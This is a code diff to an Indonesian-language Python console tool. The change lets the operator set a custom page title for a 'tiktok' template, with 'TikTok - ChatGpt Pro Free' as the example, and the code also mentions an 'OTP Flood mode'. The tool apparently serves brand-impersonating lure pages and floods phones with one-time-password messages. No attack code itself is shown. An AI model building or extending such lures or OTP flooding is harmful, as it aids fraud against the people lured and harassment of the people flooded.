@@ -276,6 +276,7 @@ class Engine:
         self.url = None
         self.building = False
         self.current_template = "bni"
+        self.custom_title = None
 
     def _nw(self):
         flags = {}
@@ -302,6 +303,9 @@ class Engine:
         tmpl_layout = os.path.join(tmpl_dir, "layout.tsx")
         if os.path.exists(tmpl_layout):
             shutil.copy2(tmpl_layout, SRC_LAYOUT)
+            # Inject custom title into layout if set
+            if template_key == "tiktok" and self.custom_title:
+                self._inject_title_into_layout(SRC_LAYOUT, self.custom_title)
         if tmpl_pub and os.path.isdir(tmpl_pub):
             for fname in os.listdir(tmpl_pub):
                 src_f = os.path.join(tmpl_pub, fname)
@@ -310,6 +314,19 @@ class Engine:
                     shutil.copy2(src_f, dst_f)
         self.current_template = template_key
         return True
+
+    def _inject_title_into_layout(self, layout_path, title):
+        """Replace hardcoded TikTok title strings in layout.tsx with custom title."""
+        try:
+            with open(layout_path, "r", encoding="utf-8") as f:
+                content = f.read()
+            old_title = TEMPLATES["tiktok"]["title"]
+            content = content.replace(old_title, title)
+            with open(layout_path, "w", encoding="utf-8") as f:
+                f.write(content)
+            return True
+        except Exception as e:
+            return False
 
     def check_port(self, port):
         return check_port(port)
@@ -633,6 +650,26 @@ def choose_template(eng):
             if key != eng.current_template:
                 eng.stop_all()
                 eng.current_template = key
+
+                # Prompt custom title for TikTok template
+                if key == "tiktok":
+                    print()
+                    print(f"  {C.CYN}Template TikTok - Masukkan Title URL kamu{C.RST}")
+                    print(f"  {C.SLATE}Contoh: TikTok - ChatGpt Pro Free{C.RST}")
+                    print(f"  {C.SLATE}atau biarkan kosong untuk default: {TEMPLATES['tiktok']['title']}{C.RST}")
+                    print()
+                    print(f"{C.CYN}  Title URL: {C.RST}", end="")
+                    custom = input().strip()
+                    if custom:
+                        eng.custom_title = custom
+                        step(f"Custom title: {custom}")
+                    else:
+                        eng.custom_title = TEMPLATES['tiktok']['title']
+                        step("Menggunakan default title")
+                    time.sleep(0.5)
+                else:
+                    eng.custom_title = None
+
                 print(f"\n{C.GRN}  Template diubah ke: {TEMPLATES[key]['name']}{C.RST}")
                 time.sleep(1)
                 eng.start_all()
@@ -688,6 +725,23 @@ def main():
         except (KeyboardInterrupt, EOFError):
             print(f"\n{C.CYN}Sampai jumpa!{C.RST}")
             sys.exit(0)
+
+    # Prompt custom title for TikTok template
+    if eng.current_template == "tiktok":
+        print()
+        print(f"  {C.CYN}Template TikTok - Masukkan Title URL kamu{C.RST}")
+        print(f"  {C.SLATE}Contoh: TikTok - ChatGpt Pro Free{C.RST}")
+        print(f"  {C.SLATE}atau biarkan kosong untuk default: {TEMPLATES['tiktok']['title']}{C.RST}")
+        print()
+        print(f"{C.CYN}  Title URL: {C.RST}", end="")
+        custom = input().strip()
+        if custom:
+            eng.custom_title = custom
+            step(f"Custom title: {custom}")
+        else:
+            eng.custom_title = TEMPLATES['tiktok']['title']
+            step(f"Menggunakan default title")
+        time.sleep(0.5)
 
     # If OTP Flood mode, run directly (no build/server needed)
     if TEMPLATES[eng.current_template].get("is_otp_mode"):
